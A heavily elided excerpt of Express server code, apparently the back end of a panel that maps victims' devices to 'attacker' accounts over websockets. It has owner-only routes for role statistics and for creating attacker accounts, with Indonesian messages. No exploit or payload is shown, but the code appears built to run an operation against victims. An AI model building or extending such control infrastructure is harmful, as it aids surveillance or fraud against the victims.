...
// victimId    → { ws, attackerId, code, deviceInfo, pending }
...
app.get('/api/owner/stats', ownerOnly, (req, res) => {
  ...
  db.attackers.forEach(a => { if (roleCounts[a.role] !== undefined) roleCounts[a.role]++; });
  res.json({
    success: true,
...
app.post('/api/owner/attackers', ownerOnly, (req, res) => {
  ...
  DB.update(db => {
    if (db.attackers.find(a => a.username === username)) {
      res.json({ success: false, message: 'Username sudah dipakai' }); responded = true; return;
    }
    ...
    if (!responded) res.json({ success: true, message: 'Akun berhasil dibuat' });
  });
});
